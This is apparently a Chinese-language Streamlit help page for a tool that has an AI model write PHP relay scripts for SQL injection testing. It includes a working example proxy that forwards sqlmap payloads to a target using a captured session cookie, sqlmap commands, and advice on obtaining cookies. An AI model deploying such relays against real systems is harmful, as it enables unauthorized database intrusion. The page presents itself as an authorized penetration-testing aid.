#!/usr/bin/env python3

import streamlit as st
from config import DEFAULT_CONFIG

# 设置页面标题
st.title("帮助文档")

# 使用说明
st.header("使用说明")

st.markdown("""
### 基本概念

此工具用于生成SQL注入测试的中转代理脚本，具有以下特点：

1. **两个URL**：
   - **提交URL**：用于接收和提交注入参数的页面
   - **结果URL**：用于显示查询结果的页面

2. **会话Cookie**：用于维持与目标应用的认证会话

3. **目标参数名称**：目标网站接收注入内容的参数名（注入点）

4. **HTTP方法**：可以选择GET或POST方法提交参数

### 中转脚本工作原理

1. 注入工具（如SQLMap）向中转脚本发送请求：`http://yourserver/proxy.php?s=注入内容`
2. 中转脚本从GET参数`s`接收注入内容
3. 中转脚本对注入内容进行URL编码
4. 中转脚本将编码后的内容作为指定的目标参数名发送给目标网站：`id=编码后内容&Submit=Submit`
5. 中转脚本从结果URL获取响应内容
6. 中转脚本将响应返回给注入工具

这样实现了注入工具与目标网站之间的中转，同时维持了会话状态。

### 详细步骤

1. 在**生成脚本**页面填写必要信息：
   - 提交URL和结果URL
   - 会话Cookie
   - 目标参数名称和HTTP方法
   - 输出文件名

2. 点击"生成代理脚本"按钮，系统将使用AI模型生成PHP代理脚本

3. 生成成功后，可以：
   - 在当前页面预览代码
   - 下载生成的PHP文件
   - 查看生成历史

4. 将生成的脚本部署到Web服务器，通过以下方式使用：
   ```
   http://yourserver/proxy.php?s=你的注入内容
   ```

5. 配置SQLMap等工具指向该中转脚本：
   ```
   sqlmap -u "http://yourserver/proxy.php?s=1" --batch
   ```
""")

# 常见问题
st.header("常见问题 (FAQ)")

faq = [
    {
        "question": "中转脚本与SQL注入工具如何配合使用？",
        "answer": "将中转脚本部署到Web服务器上，然后使用SQLMap等工具向脚本发送请求：`sqlmap -u \"http://yourserver/proxy.php?s=1\" --batch`。中转脚本负责将注入内容转发到目标，并维持会话状态。"
    },
    {
        "question": "为什么需要两个不同的URL？",
        "answer": "在许多Web应用中，接收参数和显示结果可能发生在不同的页面。中转脚本会先向提交URL发送带参数的请求，然后从结果URL获取包含查询结果的响应。"
    },
    {
        "question": "为什么脚本必须使用's'作为接收参数而不是自定义名称？",
        "answer": "为了保持工具的一致性和简单性，中转脚本统一使用's'作为接收注入内容的参数。中转脚本会将此内容转发到目标网站的指定参数中（如'id'）。"
    },
    {
        "question": "如何获取正确的会话Cookie？",
        "answer": "您可以使用浏览器的开发者工具，登录目标应用后查看Cookie信息。通常需要包含会话ID和安全级别等信息，格式如：'PHPSESSID=abc123; security=high'。"
    },
    {
        "question": "支持哪些注入参数传递方式？",
        "answer": "目前支持GET和POST两种方法。GET适用于参数在URL中传递的应用，POST适用于通过表单提交的应用。无论使用哪种方法，中转脚本始终通过GET参数's'接收注入内容。"
    },
    {
        "question": "我可以自定义生成提示词吗？",
        "answer": "是的，您可以通过命令行工具使用--custom-prompt参数指定自定义提示词文件。但网页界面暂不支持此功能。"
    }
]

for i, item in enumerate(faq):
    with st.expander(f"{i+1}. {item['question']}"):
        st.write(item['answer'])

# API配置说明
st.header("API配置")

st.markdown("""
本工具使用OpenAI API生成代理脚本。您可以在**生成脚本**页面的"API配置"部分修改以下设置：

1. **API Key**：您的OpenAI API密钥
2. **API Base URL**：API基础URL
3. **模型**：使用的语言模型名称

默认配置如下：
""")

st.code(f"""
模型: {DEFAULT_CONFIG['model']}
API Base URL: {DEFAULT_CONFIG['api_base']}
""")

# 示例代码
st.header("示例代码")

st.markdown("以下是一个典型的中转代理脚本示例：")

example_code = """<?php
// 获取注入参数
$sql = $_GET['s']; // 通过GET参数's'接收注入内容
$encoded_sql = urlencode($sql); // URL编码

// 目标URL
$submit_url = "http://example.com/app/input.php";
$result_url = "http://example.com/app/results.php";

// 会话Cookie
$cookie = "PHPSESSID=abc123; security=high";

// 创建cURL会话
$ch = curl_init();

// 设置cURL选项
curl_setopt($ch, CURLOPT_URL, $submit_url);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, "id=$encoded_sql&Submit=Submit"); // 将编码后的内容发送到目标参数
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);

// 执行POST请求
curl_exec($ch);

// 获取结果页面
curl_setopt($ch, CURLOPT_URL, $result_url);
curl_setopt($ch, CURLOPT_POST, false);
$response = curl_exec($ch);

// 输出响应
echo $response;

// 关闭cURL会话
curl_close($ch);
"""

st.code(example_code, language="php")

# 关于
st.header("关于")

st.info("""
本工具使用大语言模型生成SQL注入中转代理脚本，旨在简化渗透测试过程。
请仅在合法授权的情况下使用此工具进行测试。
""")

# 底部链接
st.markdown("---")
st.markdown("返回 [首页](/) | [生成脚本](/生成脚本) | [查看脚本](/查看脚本)") 